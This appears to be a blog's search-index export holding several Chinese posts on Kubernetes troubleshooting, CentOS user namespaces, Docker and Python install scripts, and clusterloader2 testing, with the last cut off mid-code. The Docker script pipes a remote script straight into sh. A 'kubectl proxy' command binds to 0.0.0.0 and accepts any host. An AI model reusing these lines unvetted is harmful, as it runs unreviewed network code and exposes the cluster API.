/var/lib/kubelet/pods/402d0c26-43fd-11eb-bdb1-6c92bf8c5840/volumes/kubernetes.io~secret/default-token-vlvfj type tmpfs (rw,relatime) [root@gpu53 lib]# [root@gpu53 lib]# [root@gpu53 lib]# umount /var/lib/kubelet/pods/837704db-2bae-11eb-913c-6c92bf8c5840/volumes/kubernetes.io~secret/kube-proxy-token-8mdk5 [root@gpu53 lib]# [root@gpu53 lib]# [root@gpu53 lib]# umount /var/lib/kubelet/pods/402d0c26-43fd-11eb-bdb1-6c92bf8c5840/volumes/kubernetes.io~secret/default-token-vlvfj [root@gpu53 lib]# [root@gpu53 lib]# rm -rf kubelet/   calico node pod一直没有起来 Number of node(s) with BGP peering established = 0\n1 2 3 4 5  网上解决方法如下： https://blog.csdn.net/qq_36783142/article/details/107912407 - name: IP_AUTODETECTION_METHOD value: \u0026#34;interface=enp26s0f3\u0026#34; 但此方式不能解决自己环境所遇问题。   自己分析应该是网络路由问题（原来环境残留的脏路由导致），做下清理处理\n执行下面命令解决\n1 2 3 4 5 6  systemctl stop kubelet systemctl stop docker iptables --flush iptables -tnat --flush systemctl start docker systemctl start kubelet   启动测试pod，Failed to create pod sandbox getting the final child\u0026rsquo;s pid from pipe caused: read init-p: connection reset by peer: unknown\n报错如下：\n1 2 3 4 5 6  Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 74s default-scheduler Successfully assigned default/myapp-pod to gpu53 Normal SandboxChanged 78s (x12 over 89s) kubelet Pod sandbox changed, it will be killed and re-created. Warning FailedCreatePodSandBox 77s (x13 over 90s) kubelet Failed to create pod sandbox: rpc error: code = Unknown desc = failed to start sandbox container for pod \u0026#34;myapp-pod\u0026#34;: Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child\u0026#39;s pid from pipe caused: read init-p: connection reset by peer: unknown   检查内核参数 max_user_namespaces，并修改，该方式为临时生效。\n1 2 3 4 5 6 7 8 9 10 11  [root@node2 ~]# cat /proc/sys/user/max_user_namespaces 0 [root@node2 ~]# [root@node2 ~]# [root@node2 ~]# echo 10000 \u0026gt; /proc/sys/user/max_user_namespaces [root@node2 ~]# [root@node2 ~]# [root@node2 ~]# cat /proc/sys/user/max_user_namespaces 10000 [root@node2 ~]#   具体详细修改参数user namespaces方式， 参考配置 CentOS 7 系统启用 user namespaces\nkuelet1.20 配置\u0026ndash;cgroups-per-qos=False 时会导致kubelet无法正常启动 kuelet1.20 默认开启cgroups-per-qos\nkubelet启动的pod 所在cgroup组一般都在cgroup的kubepods.slice 目录下，\n测试pod一直是ContainerCreating 1 2 3  NAMESPACE NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES default myapp-pod 0/1 ContainerCreating 0 11m \u0026lt;none\u0026gt; gpu53 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; k   系统日志打印信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  Dec 23 09:52:18 gpu53 kernel: Task in /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice/docker-1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2.scope killed as a result of limit of /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice Dec 23 09:52:18 gpu53 kernel: memory: usage 2048kB, limit 2048kB, failcnt 861 Dec 23 09:52:18 gpu53 kernel: memory+swap: usage 2048kB, limit 9007199254740988kB, failcnt 0 Dec 23 09:52:18 gpu53 kernel: kmem: usage 0kB, limit 9007199254740988kB, failcnt 0 Dec 23 09:52:18 gpu53 kernel: Memory cgroup stats for /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice: cache:0KB rss:0KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:0KB inactive_file:0KB active_file:0KB unevictable:0KB Dec 23 09:52:18 gpu53 kernel: Memory cgroup stats for /kubepods.slice/kubepods-pod40b435fc_0bbb_4eeb_9bff_5ce1f473cb9e.slice/docker-1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2.scope: cache:0KB rss:2048KB rss_huge:0KB mapped_file:0KB swap:0KB inactive_anon:0KB active_anon:2020KB inactive_file:0KB active_file:0KB unevictable:0KB Dec 23 09:52:18 gpu53 kernel: [ pid ] uid tgid total_vm rss nr_ptes swapents oom_score_adj name Dec 23 09:52:18 gpu53 kernel: [112691] 0 112691 5734 1041 13 0 -998 6 Dec 23 09:52:18 gpu53 kernel: Memory cgroup out of memory: Kill process 112691 (6) score 1998 or sacrifice child Dec 23 09:52:18 gpu53 kernel: Killed process 112691 (6) total-vm:22936kB, anon-rss:1944kB, file-rss:2220kB, shmem-rss:0kB Dec 23 09:52:18 gpu53 systemd: Stopped libcontainer container 1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2. Dec 23 09:52:18 gpu53 systemd: Stopping libcontainer container 1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2. Dec 23 09:52:18 gpu53 containerd: time=\u0026#34;2020-12-23T09:52:18.227196277+08:00\u0026#34; level=info msg=\u0026#34;shim reaped\u0026#34; id=1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2 Dec 23 09:52:18 gpu53 dockerd: time=\u0026#34;2020-12-23T09:52:18.237403201+08:00\u0026#34; level=error msg=\u0026#34;stream copy error: reading from a closed fifo\u0026#34; Dec 23 09:52:18 gpu53 dockerd: time=\u0026#34;2020-12-23T09:52:18.237413120+08:00\u0026#34; level=error msg=\u0026#34;stream copy error: reading from a closed fifo\u0026#34; Dec 23 09:52:18 gpu53 dockerd: time=\u0026#34;2020-12-23T09:52:18.271031114+08:00\u0026#34; level=error msg=\u0026#34;1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2 cleanup: failed to delete container from containerd: no such container\u0026#34; Dec 23 09:52:18 gpu53 dockerd: time=\u0026#34;2020-12-23T09:52:18.271110530+08:00\u0026#34; level=error msg=\u0026#34;Handler for POST /v1.40/containers/1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2/start returned error: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child\u0026#39;s pid from pipe caused: read init-p: connection reset by peer: unknown\u0026#34; Dec 23 09:52:18 gpu53 kubelet: E1223 09:52:18.271582 104914 remote_runtime.go:116] RunPodSandbox from runtime service failed: rpc error: code = Unknown desc = failed to start sandbox container for pod \u0026#34;myapp-pod\u0026#34;: Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child\u0026#39;s pid from pipe caused: read init-p: connection reset by peer: unknown Dec 23 09:52:18 gpu53 kubelet: E1223 09:52:18.271680 104914 kuberuntime_sandbox.go:70] CreatePodSandbox for pod \u0026#34;myapp-pod_default(40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e)\u0026#34; failed: rpc error: code = Unknown desc = failed to start sandbox container for pod \u0026#34;myapp-pod\u0026#34;: Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child\u0026#39;s pid from pipe caused: read init-p: connection reset by peer: unknown Dec 23 09:52:18 gpu53 kubelet: E1223 09:52:18.271705 104914 kuberuntime_manager.go:755] createPodSandbox for pod \u0026#34;myapp-pod_default(40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e)\u0026#34; failed: rpc error: code = Unknown desc = failed to start sandbox container for pod \u0026#34;myapp-pod\u0026#34;: Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child\u0026#39;s pid from pipe caused: read init-p: connection reset by peer: unknown Dec 23 09:52:18 gpu53 kubelet: E1223 09:52:18.271793 104914 pod_workers.go:191] Error syncing pod 40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e (\u0026#34;myapp-pod_default(40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e)\u0026#34;), skipping: failed to \u0026#34;CreatePodSandbox\u0026#34; for \u0026#34;myapp-pod_default(40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e)\u0026#34; with CreatePodSandboxError: \u0026#34;CreatePodSandbox for pod \\\u0026#34;myapp-pod_default(40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e)\\\u0026#34; failed: rpc error: code = Unknown desc = failed to start sandbox container for pod \\\u0026#34;myapp-pod\\\u0026#34;: Error response from daemon: OCI runtime create failed: container_linux.go:370: starting container process caused: process_linux.go:338: getting the final child\u0026#39;s pid from pipe caused: read init-p: connection reset by peer: unknown\u0026#34; Dec 23 09:52:19 gpu53 kubelet: I1223 09:52:19.101556 104914 kubelet.go:1923] SyncLoop (PLEG): \u0026#34;myapp-pod_default(40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e)\u0026#34;, event: \u0026amp;pleg.PodLifecycleEvent{ID:\u0026#34;40b435fc-0bbb-4eeb-9bff-5ce1f473cb9e\u0026#34;, Type:\u0026#34;ContainerDied\u0026#34;, Data:\u0026#34;1f0491dfbae47dcf8a6b8f5b6f94e50ef3da592420f2d25e34d87f30524f71f2\u0026#34;}   检查kubelet的cgroup参数和系统中的cgroup配置，没有问题。 定位测试pod请求资源太少（2M）导致，实际内存使用量超过2M，导致系统根据cgroup杀掉该pod容器进程 把该pod请求内存改大，比如20M，则pod运行正常。\n附录 命令  给节点node2 打master标签  1  kubectl label node node2 node-role.kubernetes.io/master=true --overwrite    给节点gpu53 打node标签  1  kubectl label node gpu53 node-role.kubernetes.io/node=true --overwrite    强制删除某pod  1  kubectl delete po myapp-pod --force --grace-period=0    docker 镜像批量打包  1  docker save $(docker images | grep -v REPOSITORY | awk \u0026#39;BEGIN{OFS=\u0026#34;:\u0026#34;;ORS=\u0026#34; \u0026#34;}{print $1,$2}\u0026#39;) -o k8s_packages.tar   访问dashboard 使用kubectl proxy\n使用kubectl proxy命令就可以使API server监听在本地的8001端口上 使用命令如下:\n1  kubectl proxy --address=\u0026#39;0.0.0.0\u0026#39; --accept-hosts=\u0026#39;^*$\u0026#39;   则在内网的任意节点浏览器中可以使用地址访问，当然该地址需要证书授权访问\n1  curl http://192.168.182.131:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/   ","permalink":"http://bingerambo.com/posts/2020/12/%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2k8s/","tags":["K8S"],"title":"安装部署k8s"},{"categories":["Linux"],"contents":"在 CentOS 内核 3.8 或更高版本中，添加了 user namespaces （户名命名空间）功能。但是，该功能默认情况下是禁用的，原因是 Red Hat 希望该功能在社区中孵化更长时间，以确保该功能的稳定性和安全性。目前越来越多的软件开始涉及该功能，例如 Docker 等。\n配置 CentOS 7 系统启用 user namespaces 注意：以下操作均在 root 用户下完成，或者你的超级用户。\n查看系统内核版本：\n1 2 3  uname -r #3.10.0-1062.el7.x86_64   临时配置，重启会失效，可用作临时验证：\n1 2 3 4 5  # 查看系统 user namespaces 最大为 0 cat /proc/sys/user/max_user_namespaces #0 # 临时开启 user namespace ，向文件内写入一个整数。 echo 10000 \u0026gt; /proc/sys/user/max_user_namespaces   永久配置，设置 CentOS 7 的 kernel 开启 user namespace ，默认情况下是禁用的。并且，写入/etc/sysctl.conf配置user.max_user_namespaces=10000，最后重启系统。\n1 2 3 4 5 6  # kernel 设置 grubby --args=\u0026#34;user_namespace.enable=1\u0026#34; --update-kernel=\u0026#34;$(grubby --default-kernel)\u0026#34; # 写入配置文件 echo \u0026#34;user.max_user_namespaces=10000\u0026#34; \u0026gt;\u0026gt; /etc/sysctl.conf # 重启 reboot   如需关闭 user namespace ，使用如下命令：\n1  grubby --remove-args=\u0026#34;user_namespace.enable=1\u0026#34; --update-kernel=\u0026#34;$(grubby --default-kernel)\u0026#34;   参考资料 https://www.redhat.com/en/blog/whats-next-containers-user-namespaces\nhttps://github.com/procszoo/procszoo/wiki/How-to-enable-%22user%22-namespace-in-RHEL7-and-CentOS7%3F\nhttps://superuser.com/questions/1294215/is-it-safe-to-enable-user-namespaces-in-centos-7-4-and-how-to-do-it\n","permalink":"http://bingerambo.com/posts/2020/12/centos-7-%E5%90%AF%E7%94%A8-user-namespaces%E7%94%A8%E6%88%B7%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/","tags":["Linux","CentOS"],"title":"CentOS 7 启用 user namespaces（用户命名空间）"},{"categories":["Docker"],"contents":"脚本一键安装部署docker19.03\n安装脚本  使用阿里云镜像源 docker参数 native.cgroupdriver=systemd  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  #!/bin/bash  # 安装docker # VAR SET DOCKER_VERSION=\u0026#34;19.03.8\u0026#34; echo \u0026#34;START to install docker $DOCKER_VERSION\u0026#34; export REGISTRY_MIRROR=https://registry.cn-hangzhou.aliyuncs.com # a) 检查和卸载旧版本(如果之前有安装docker) echo \u0026#34;check and uninstall old docker...\u0026#34; yum remove -y docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine # b) 配置yum repository echo \u0026#34;config yum repository...\u0026#34; yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # c) 安装并启动docker echo \u0026#34;install docker $DOCKER_VERSION\u0026#34; yum install -y docker-ce-$DOCKER_VERSION docker-ce-cli-$DOCKER_VERSION containerd.io systemctl enable docker systemctl start docker # d) 修改docker Cgroup Driver为systemd echo \u0026#34;config docker Cgroup Driver: systemd\u0026#34; sed -i \u0026#34;s#^ExecStart=/usr/bin/dockerd.*#ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --exec-opt native.cgroupdriver=systemd#g\u0026#34; /usr/lib/systemd/system/docker.service # e) 设置 docker 镜像，提高 docker 镜像下载速度和稳定性 echo \u0026#34;set docker mirror...\u0026#34; curl -sSL https://kuboard.cn/install-script/set_mirror.sh | sh -s ${REGISTRY_MIRROR} systemctl daemon-reload systemctl restart docker docker version   ","permalink":"http://bingerambo.com/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2docker/","tags":["Docker"],"title":"脚本部署Docker"},{"categories":["Python"],"contents":"脚本一键安装部署Python3\n安装脚本  centos系统自带默认python2 py3命令需要跟py2进行区别  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #! /bin/bash yum -y install zlib-devel bzip2-devel libffi-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel wget gcc python-devel openssl sshpass wget https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tgz mkdir -p /usr/local/python3 tar -xf Python-3.7.1.tgz yum install libffi-devel -y cd Python-3.7.1 pwd ./configure --prefix=/usr/local/python3 make make install ln -s /usr/local/python3/bin/python3 /usr/bin/python3 ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3 echo \u0026#39;PATH=$PATH:$HOME/bin:/usr/local/python3/bin\u0026#39; \u0026gt;\u0026gt;/etc/profile echo \u0026#39;export PATH\u0026#39; \u0026gt;\u0026gt;/etc/profile source /etc/profile   ","permalink":"http://bingerambo.com/posts/2020/12/%E8%84%9A%E6%9C%AC%E9%83%A8%E7%BD%B2python3/","tags":["Python"],"title":"脚本部署Python3"},{"categories":["K8S"],"contents":"如何使用perf-test的clusterloader进行性能测试\n1 K8S的性能指标：SLIs/SLOs K8S的SLI (服务等级指标) 和 SLO (服务等级目标)： Kubernetes 社区提供的K8S系统性能测试指标定义。\n社区参考文档：Kubernetes scalability and performance SLIs/SLOs\n目前社区提供的官方正式的性能指标有3个，如下表：\n   Status SLI SLO     Official Latency of mutating API calls for single objects for every (resource, verb) pair, measured as 99th percentile over last 5 minutes In default Kubernetes installation, for every (resource, verb) pair, excluding virtual and aggregated resources and Custom Resource Definitions, 99th percentile per cluster-day1 \u0026lt;= 1s   Official Latency of non-streaming read-only API calls for every (resource, scope pair, measured as 99th percentile over last 5 minutes In default Kubernetes installation, for every (resource, scope) pair, excluding virtual and aggregated resources and Custom Resource Definitions, 99th percentile per cluster-day1 (a) \u0026lt;= 1s if scope=resource (b) \u0026lt;= 5s if scope=namespace (c) \u0026lt;= 30s if scope=cluster   Official Startup latency of schedulable stateless pods, excluding time to pull images and run init containers, measured from pod creation timestamp to when all its containers are reported as started and observed via watch, measured as 99th percentile over last 5 minutes In default Kubernetes installation, 99th percentile per cluster-day1 \u0026lt;= 5s    2 clusterloader准备  从github上拉取perf-test项目，其中包含clusterloader2。perf-tests位置为：$GOPATH/src/k8s.io/perf-tests  需要选择与测试k8s集群匹配的版本，这里选择了1.14版本   进入clusterloader2目录，进行编译  1 2 3  export GOPATH=/home/wangb/goprojects cd $GOPATH/src/k8s.io/perf-tests/clusterloader2 go build -o clusterloader \u0026#39;./cmd/\u0026#39;   clusterloader2的测试配置文件在testing目录下。可以参考修改配置 按修改后的测试配置文件，指定参数变量，执行clusterloader测试  3 clusterloader测试 1. 运行命令 说明：运行命令前，需要根据测试场景，修改测试配置文件中的变量参数，配置文件包括有config.yaml， rc.yaml，deployment.yaml 具体配置参数说明，见下文。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  # 进入clusterloader可执行文件目录，配置文件也需转移到了此位置 cd /home/wangb/perf-test/clusterloader2 # ssh访问参数 export KUBE_SSH_KEY_PATH=/root/.ssh/id_rsa # master节点信息 MASTER_NAME=node1 TEST_MASTER_IP=192.168.182.101 TEST_MASTER_INTERNAL_IP=192.168.182.101 KUBE_CONFIG=${HOME}/.kube/config # 测试配置文件 TEST_CONFIG=\u0026#39;/home/wangb/perf-test/clusterloader2/testing/density/config2.yaml\u0026#39; # 测试报告目录位置 REPORT_DIR=\u0026#39;./reports\u0026#39; # 测试日志打印文件 LOG_FILE=\u0026#39;test.log\u0026#39; ./clusterloader --kubeconfig=$KUBE_CONFIG \\  --mastername=$TEST_MASTER_IP \\  --masterip=$MASTER_IP \\  --master-internal-ip=TEST_MASTER_INTERNAL_IP \\  --testconfig=$TEST_CONFIG \\  --report-dir=$REPORT_DIR \\  --alsologtostderr 2\u0026gt;\u0026amp;1 | tee $LOG_FILE   运行命令可以指定nodes数量，不过这里默认使用集群全部节点。\n2. 测试配置文件 test config（默认） density 测试配置   Steps is the procedures you defined. Each step might contain phases, measurements Meansurement defines what you want to supervise or capture. Phase describes the attributes of some certain tasks.     This config defines the following steps:   Starting measurements : don’t care about what happens during preparation. Starting saturation pod measurements : same as above Creating saturation pods : the first case is saturation pods Collecting saturation pod measurements Starting latency pod measurements Creating latency pods : the second case is latency pods Waiting for latency pods to be running Deleting latency pods Waiting for latency pods to be deleted Collecting pod startup latency Deleting saturation pods Waiting for saturation pods to be deleted Collecting measurements     So we can see the testing mainly gathers measurements during the CRUD of saturation pods and latency pods:\n saturation pods: pods in deployments with quite a large repliacas latency pods: pods in deployments with one replicas  So you see the differences between the two modes. When saturation pods are created, replicas-controller in kube-controller-manager is handling one event. But in terms of latency pods, it’s hundreds of events. But what’s the difference anyway? It’s because the various rate-limiter inside kubernetes affects the performance of scheduler and controller-manager.\nIn each case, what we’re concerned is the number of pods, deployments and namespaces. We all know that kubernetes limits the pods/node, pods/namespace, so it’s quite essential to adust relative parameters to achieve a reasonable load.\ntest config.yaml（默认配置） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203  # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).#Constants{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \u0026#34;\u0026#34;}}{{$NODE_MODE := DefaultParam .NODE_MODE \u0026#34;allnodes\u0026#34;}}{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 100}}{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 30}}{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 20}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 100}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 350}}{{$MIN_LATENCY_PODS := 500}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS true}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \u0026#34;\u0026#34;}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}{{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won\u0026#39;t fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:qps:5{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MODE}}resourceConstraints:{{$DENSITY_RESOURCE_CONSTRAINTS_FILE}}systemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}# Create saturation pods- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = saturationthreshold:{{$saturationRCTimeout}}s- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = saturationoperationTimeout:{{$saturationRCHardTimeout}}s- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:1tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc.yamltemplateFillMap:Replicas:{{$podsPerNamespace}}Group:saturationCpuRequest:1mMemoryRequest:10M- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:startlabelSelector:group = saturation- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:gather- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:gather- name:Creating saturation pods# Create latency pods- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = latency- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = latencyoperationTimeout:15m- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:{{$latencyReplicas}}tuningSet:Uniform5qpsobjectBundle:- basename:latency-pod-rcobjectTemplatePath:rc.yamltemplateFillMap:Replicas:1Group:latencyCpuRequest:{{$LATENCY_POD_CPU}}mMemoryRequest:{{$LATENCY_POD_MEMORY}}M- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Creating latency pods# Remove latency pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:latency-pod-rcobjectTemplatePath:rc.yaml- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:gather- name:Deleting latancy pods# Delete pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc.yaml- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Deleting saturation pods# Collect measurements- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:gather- Identifier:TestMetricsMethod:TestMetricsParams:action:gathersystemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}  rc.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  apiVersion:v1kind:ReplicationControllermetadata:name:{{.Name}}labels:group:{{.Group}}spec:replicas:{{.Replicas}}selector:name:{{.Name}}template:metadata:labels:name:{{.Name}}group:{{.Group}}spec:containers:- image:k8s.gcr.io/pause:3.1imagePullPolicy:IfNotPresentname:{{.Name}}ports:resources:requests:cpu:{{.CpuRequest}}memory:{{.MemoryRequest}}# Add not-ready/unreachable tolerations for 15 minutes so that node# failure doesn\u0026#39;t trigger pod deletion.tolerations:- key:\u0026#34;node.kubernetes.io/not-ready\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900- key:\u0026#34;node.kubernetes.io/unreachable\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900  deployment.yaml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  apiVersion:apps/v1kind:Deploymentmetadata:name:{{.Name}}labels:group:{{.Group}}spec:replicas:{{.Replicas}}selector:matchLabels:name:{{.Name}}template:metadata:labels:name:{{.Name}}group:{{.Group}}spec:containers:- image:k8s.gcr.io/pause:3.1imagePullPolicy:IfNotPresentname:{{.Name}}ports:resources:requests:cpu:{{.CpuRequest}}memory:{{.MemoryRequest}}# Add not-ready/unreachable tolerations for 15 minutes so that node# failure doesn\u0026#39;t trigger pod deletion.tolerations:- key:\u0026#34;node.kubernetes.io/not-ready\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900- key:\u0026#34;node.kubernetes.io/unreachable\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900  3. clusterloader2 源码简析 解析测试配置信息，执行测试测试用例 clusterloader2/cmd/clusterloader.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  void main(){ // 构造clusterLoaderConfig  // 构造framework，即各种k8s client  f, err := framework.NewFramework( \u0026amp;clusterLoaderConfig.ClusterConfig, getClientsNumber(clusterLoaderConfig.ClusterConfig.Nodes), ) // 遍历测试配置文件（可多个），按配置用例运行测试  for _, clusterLoaderConfig.TestConfigPath = range testConfigPaths { test.RunTest(f, prometheusFramework, \u0026amp;clusterLoaderConfig) } }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  // RunTest runs test based on provided test configuration. func RunTest(clusterFramework, prometheusFramework *framework.Framework, clusterLoaderConfig *config.ClusterLoaderConfig) *errors.ErrorList { // simpleContext上下文信息  ctx := CreateContext(clusterLoaderConfig, clusterFramework, prometheusFramework, state.NewState()) testConfigFilename := filepath.Base(clusterLoaderConfig.TestConfigPath) // 按参数 设置override config 和 nodes参数  mapping, errList := config.GetMapping(clusterLoaderConfig) if errList != nil { return errList } // 使用emplateProvider根据mapping信息把testConfig的模板文件渲染成可用的api.Config  testConfig, err := ctx.GetTemplateProvider().TemplateToConfig(testConfigFilename, 